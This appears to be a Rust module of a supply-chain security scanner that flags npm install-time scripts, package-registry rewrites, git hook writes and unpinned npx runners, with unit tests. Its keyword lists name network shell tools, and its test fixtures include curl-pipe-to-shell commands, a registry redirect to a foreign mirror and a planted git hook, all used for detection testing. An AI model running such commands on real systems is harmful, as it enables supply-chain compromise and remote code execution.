//! Install-time behaviour (spec D2.4): `package.json` lifecycle scripts (and every script run as
//! shell code), package-registry rewrites, git hook writes, and unpinned package runners.

use serde_json::Value;

use super::context::{
    self, find_any, find_word, find_word_from, shell_tokens, Cmd, Document, FileClass, Lang, Stmt,
    T_NPX, T_REG,
};
use super::network_ctx::VarCache;
use super::{line_no, Ctx, FileOut, Severity, Signal};

/// npm lifecycle scripts that run on `npm install` (spec D2.4).
const LIFECYCLE: &[&str] = &["preinstall", "install", "postinstall", "prepare"];
/// Package-manager configuration files that redirect where packages come from.
const REGISTRY_FILES: &[&str] = &[
    ".npmrc",
    ".yarnrc",
    "pip.conf",
    "pip.ini",
    ".pypirc",
    ".cargo/config",
    ".gemrc",
    "bunfig.toml",
    ".condarc",
];
/// Commands that rewrite a package registry.
const REGISTRY_COMMANDS: &[&str] = &[
    "npm config set registry",
    "npm set registry",
    "npm config set @",
    "yarn config set registry",
    "yarn config set npmregistryserver",
    "pnpm config set registry",
    "pip config set",
    "poetry config repositories",
    "poetry source add",
];
/// API calls that write a file.
const WRITE_CALLS: &[&str] = &[
    "writefile",
    "appendfile",
    "write_text(",
    "write_bytes(",
    "fs::write(",
    "copyfile",
    "set-content",
    "out-file",
    "add-content",
];
/// Registries whose use needs no warning.
const DEFAULT_REGISTRY_HOSTS: &[&str] = &[
    "registry.npmjs.org",
    "registry.npmjs.com",
    "registry.yarnpkg.com",
    "pypi.org",
    "pypi.python.org",
    "files.pythonhosted.org",
    "crates.io",
    "rubygems.org",
];

pub(super) fn scan_cmd(cmd: &Cmd<'_>, out: &mut FileOut) {
    let lower = cmd.lower();
    let ctx = cmd.ctx();
    if cmd.bits & T_REG != 0 {
        if let Some(p) = registry_write(lower) {
            out.emit("registry_write", Severity::High, Some(cmd.line_at(p)), ctx);
            out.signal(Signal::RegistryWrite(cmd.line_at(p)), ctx);
        }
        if let Some(p) = git_hooks_write(lower) {
            out.emit("git_hooks_write", Severity::High, Some(cmd.line_at(p)), ctx);
        }
    }
    if cmd.bits & T_NPX != 0 {
        if let Some(p) = unpinned_runner(lower) {
            out.emit("unpinned_npx", Severity::Info, Some(cmd.line_at(p)), ctx);
        }
    }
}

/// Code lines naming a registry on a non-default host (the other half of `registry_hijack`).
pub(super) fn scan_registry_hosts(doc: &Document<'_>, out: &mut FileOut) {
    if !matches!(doc.class, FileClass::Code(_)) {
        return;
    }
    for i in 0..doc.len() {
        if doc.bits(i) & T_REG == 0 {
            continue;
        }
        let line = doc.lower_line(i);
        if find_any(
            line,
            &[
                "registry",
                "index-url",
                "index_url",
                "indexurl",
                "insteadof",
            ],
        )
        .is_none()
        {
            continue;
        }
        if line.contains("insteadof") && same_host_rewrite(line) {
            continue;
        }
        let mut from = 0;
        while let Some((p, host)) = context::next_url_host(line, from) {
            from = p + 3;
            let default = DEFAULT_REGISTRY_HOSTS.iter().any(|d| {
                host.strip_suffix(d)
                    .is_some_and(|rest| rest.is_empty() || rest.ends_with('.'))
            });
            if !host.is_empty()
                && !default
                && !context::is_local_host(host)
                && !host.starts_with(['$', '{', '<'])
            {
                out.signal(Signal::RegistryHost(line_no(i)), Ctx::Code);
                break;
            }
        }
    }
}

/// A git `insteadOf` that only adds credentials: every URL on the line names the same host.
fn same_host_rewrite(line: &str) -> bool {
    let mut hosts: Vec<&str> = Vec::new();
    let mut from = 0;
    while let Some((p, host)) = context::next_url_host(line, from) {
        from = p + 3;
        hosts.push(host);
    }
    hosts.len() >= 2 && hosts.iter().all(|h| *h == hosts[0])
}

/// Every `package.json` script is shell code; lifecycle scripts are HIGH on their own and feed
/// `lifecycle_network` when they reach the network or evaluate inline code.
pub(super) fn scan_package_json(doc: &Document<'_>, vars: &mut VarCache, out: &mut FileOut) {
    let Ok(json) = serde_json::from_str::<Value>(doc.text) else {
        return;
    };
    let Some(scripts) = json.get("scripts").and_then(Value::as_object) else {
        return;
    };
    let from = (0..doc.len())
        .find(|&i| doc.lower_line(i).contains("\"scripts\""))
        .unwrap_or(0);
    for (key, value) in scripts {
        let Some(script) = value.as_str() else {
            continue;
        };
        let line = key_line(doc, key, from);
        let stmt = Stmt::owned(script, line, Lang::Shell, Ctx::Code);
        super::scan_stmt(&stmt, doc, vars, out);
        if LIFECYCLE.contains(&key.as_str()) {
            out.emit("lifecycle_script", Severity::High, Some(line), Ctx::Meta);
            if reaches_out(&stmt.lower) {
                out.signal(Signal::LifecycleNet(line), Ctx::Meta);
            }
        }
    }
}

/// 1-based line of `"key":` at or after line index `from`.
fn key_line(doc: &Document<'_>, key: &str, from: usize) -> u32 {
    let needle = format!("\"{}\"", key.to_ascii_lowercase());
    (from..doc.len())
        .find(|&i| {
            let l = doc.lower_line(i);
            l.match_indices(&needle)
                .any(|(p, _)| l[p + needle.len()..].trim_start().starts_with(':'))
        })
        .map_or_else(|| line_no(from), line_no)
}

/// Network access or inline evaluation in a lifecycle script.
fn reaches_out(s: &str) -> bool {
    let network = [
        "curl", "wget", "nc", "ncat", "netcat", "npx", "bunx", "dlx", "fetch",
    ]
    .iter()
    .any(|w| find_word(s, w).is_some())
        || s.contains("://");
    network
        || find_word(s, "eval").is_some()
        || s.contains("deno eval")
        || interpreter_flag(
            s,
            &["node", "nodejs", "bun"],
            &["-e", "--eval", "-p", "--print", "-pe"],
        )
        || interpreter_flag(s, &["python", "python2", "python3"], &["-c"])
        || interpreter_flag(s, &["perl", "ruby"], &["-e"])
}

fn interpreter_flag(s: &str, interpreters: &[&str], flags: &[&str]) -> bool {
    interpreters.iter().any(|interp| {
        let mut from = 0;
        while let Some(p) = find_word_from(s, interp, from) {
            from = p + interp.len();
            if s[from..]
                .split_whitespace()
                .next()
                .is_some_and(|f| flags.contains(&f))
            {
                return true;
            }
        }
        false
    })
}

/// Offset of a write to package-manager registry configuration.
fn registry_write(s: &str) -> Option<usize> {
    if let Some(p) = find_any(s, REGISTRY_COMMANDS) {
        return Some(p);
    }
    if s.contains("insteadof") {
        if let Some(p) = s.find("git config") {
            return Some(p);
        }
    }
    for file in REGISTRY_FILES {
        let mut from = 0;
        while let Some(p) = s.get(from..).and_then(|r| r.find(file)).map(|p| p + from) {
            from = p + file.len();
            if written(s, p) {
                return Some(p);
            }
        }
    }
    None
}

/// Offset of a git hook write or a persistent `core.hooksPath` change. A one-off
/// `git -c core.hooksPath=/dev/null …` disables hooks and is not a write.
fn git_hooks_write(s: &str) -> Option<usize> {
    if let Some(p) = s.find("core.hookspath") {
        let value = s[p + "core.hookspath".len()..]
            .trim_start_matches(['=', ' ', '"', '\''])
            .split(|c: char| c.is_whitespace() || c == '"' || c == '\'')
            .next()
            .unwrap_or("");
        if s.contains("git config") && value != "/dev/null" && !value.is_empty() {
            return Some(p);
        }
    }
    let mut from = 0;
    while let Some(p) = s
        .get(from..)
        .and_then(|r| r.find(".git/hooks/"))
        .map(|p| p + from)
    {
        from = p + ".git/hooks/".len();
        if written(s, p) || s.contains("chmod +x") || find_word(&s[..p], "ln").is_some() {
            return Some(p);
        }
    }
    None
}

/// True when the path at byte `p` is a write target: a redirection, `tee`, a write API, or the
/// destination of `cp`/`mv`/`install`.
fn written(s: &str, p: usize) -> bool {
    let start = s[..p].rfind(char::is_whitespace).map_or(0, |q| q + 1);
    if s[start..p].starts_with('>') || s[..start].trim_end().ends_with('>') {
        return true;
    }
    if find_word(&s[..p], "tee").is_some() || find_any(s, WRITE_CALLS).is_some() {
        return true;
    }
    let copies = ["cp ", "mv ", "install "].iter().any(|c| s.starts_with(c));
    // The destination of a copy is its last argument.
    copies && s[p..].split_whitespace().nth(1).is_none()
}

/// Offset of an unpinned `npx`/`uvx`/`bunx` package or an `@latest` spec.
fn unpinned_runner(s: &str) -> Option<usize> {
    if let Some(p) = s.find("@latest") {
        return Some(p);
    }
    for runner in ["npx", "uvx", "bunx"] {
        let mut from = 0;
        while let Some(p) = find_word_from(s, runner, from) {
            from = p + runner.len();
            let toks = shell_tokens(&s[p..context::floor_char_boundary(s, p + 256)]);
            let Some((_, spec)) = toks.iter().skip(1).find(|(_, t)| !t.starts_with('-')) else {
                continue;
            };
            let spec = context::unquote(spec);
            let ats = spec.matches('@').count();
            let versioned = if spec.starts_with('@') {
                ats >= 2
            } else {
                ats >= 1
            };
            let pinned = versioned || spec.contains("==");
            if !spec.is_empty() && !pinned && !spec.starts_with('$') {
                return Some(p);
            }
        }
    }
    None
}

#[cfg(test)]
mod tests {
    use super::super::testkit::*;
    use super::super::{grade, Ctx, Grade, Severity};

    #[test]
    fn lifecycle_script_is_high_at_its_key_line() {
        let r = scan_one(
            "package.json",
            "{\n  \"name\": \"x\",\n  \"scripts\": { \"postinstall\": \"node bin/install.js\" }\n}\n",
        );
        let f = hits(&r, "lifecycle_script");
        assert_eq!(f.len(), 1, "{r:?}");
        assert_eq!(
            (f[0].sev, f[0].ctx, f[0].line),
            (Severity::High, Ctx::Meta, Some(3))
        );
        assert!(r.combos.is_empty(), "{r:?}");
        assert_eq!(grade(&r), Grade::High);
    }

    #[test]
    fn prepare_counts_and_plain_scripts_do_not() {
        let r = scan_one(
            "package.json",
            "{\"scripts\": {\"prepare\": \"husky install\", \"test\": \"jest\", \"build\": \"tsc\"}}",
        );
        assert_eq!(hits(&r, "lifecycle_script").len(), 1, "{r:?}");
    }

    #[test]
    fn lifecycle_with_network_or_inline_eval_is_a_combo() {
        for script in [
            "curl -s https://example.invalid/x | sh",
            "node -e \"require('./x')\"",
            "npx some-installer",
        ] {
            let body = format!(
                "{{\n  \"scripts\": {{\n    \"preinstall\": \"{}\"\n  }}\n}}\n",
                script.replace('"', "\\\"")
            );
            let r = scan_one("package.json", &body);
            let c = combo(&r, "lifecycle_network");
            assert!(c.is_some(), "{script}: {r:?}");
            assert_eq!(c.unwrap().line, Some(3));
        }
    }

    #[test]
    fn non_lifecycle_scripts_run_as_code() {
        let r = scan_one(
            "package.json",
            "{\n  \"scripts\": {\n    \"setup\": \"curl -fsSL https://example.invalid/i | bash\"\n  }\n}\n",
        );
        let f = hits(&r, "download_and_run");
        assert_eq!(
            (f[0].sev, f[0].ctx, f[0].line),
            (Severity::High, Ctx::Code, Some(3)),
            "{r:?}"
        );
        assert!(!has(&r, "lifecycle_script"));
    }

    #[test]
    fn registry_write_with_foreign_host_is_a_combo() {
        let sh = "#!/bin/bash\nCORP_REGISTRY=\"https://npm.mirror.example.invalid\"\nsetup() {\n    cat > \"$PROJECT/.npmrc\" << EOF\nregistry=${CORP_REGISTRY}\nEOF\n}\n";
        let r = scan_one("scripts/bootstrap.sh", sh);
        let f = hits(&r, "registry_write");
        assert_eq!((f[0].sev, f[0].line), (Severity::High, Some(4)), "{r:?}");
        let c = combo(&r, "registry_hijack").expect("registry_hijack");
        assert_eq!(c.line, Some(4));
    }

    #[test]
    fn registry_write_to_default_host_is_high_only() {
        let r = scan_one(
            "s.sh",
            "npm config set registry https://registry.npmjs.org/\n",
        );
        assert!(has(&r, "registry_write"), "{r:?}");
        assert!(r.combos.is_empty(), "{r:?}");
    }

    #[test]
    fn git_hook_writes_are_high() {
        let r = scan_one(
            "s.sh",
            "cat > \"$P/.git/hooks/pre-commit\" << 'HOOK'\nexit 0\nHOOK\ngit config core.hooksPath .githooks\n",
        );
        let lines: Vec<_> = hits(&r, "git_hooks_write").iter().map(|f| f.line).collect();
        assert_eq!(lines, vec![Some(1), Some(4)], "{r:?}");
    }

    #[test]
    fn disabling_hooks_and_credential_rewrites_are_not_hijacks() {
        let r = scan_one(
            "persist.sh",
            "git -c core.hooksPath=/dev/null clone --depth 1 \"$URL\" \"$DIR\"\ngit -C \"$DIR\" -c core.hooksPath=/dev/null sparse-checkout set x\n",
        );
        assert!(!has(&r, "git_hooks_write"), "{r:?}");
        let r = scan_one(
            "ci.sh",
            "git config --global url.\"https://x-access-token:${TOKEN}@github.com/\".insteadOf \"https://github.com/\"\n",
        );
        assert!(has(&r, "registry_write"), "{r:?}");
        assert!(r.combos.is_empty(), "{r:?}");
        let r = scan_one(
            "evil.sh",
            "git config --global url.\"https://mirror.example.invalid/\".insteadOf \"https://github.com/\"\n",
        );
        assert!(combo(&r, "registry_hijack").is_some(), "{r:?}");
    }

    #[test]
    fn unpinned_npx_is_info() {
        let r = scan_one("setup.sh", "#!/bin/sh\n\nnpx -y some-mcp-server\n");
        let f = hits(&r, "unpinned_npx");
        assert_eq!((f[0].sev, f[0].line), (Severity::Info, Some(3)), "{r:?}");
        let pinned = format!("npx -y @scope/pkg{}1.0.0\n", '@');
        assert!(!has(&scan_one("p.sh", &pinned), "unpinned_npx"));
    }
}
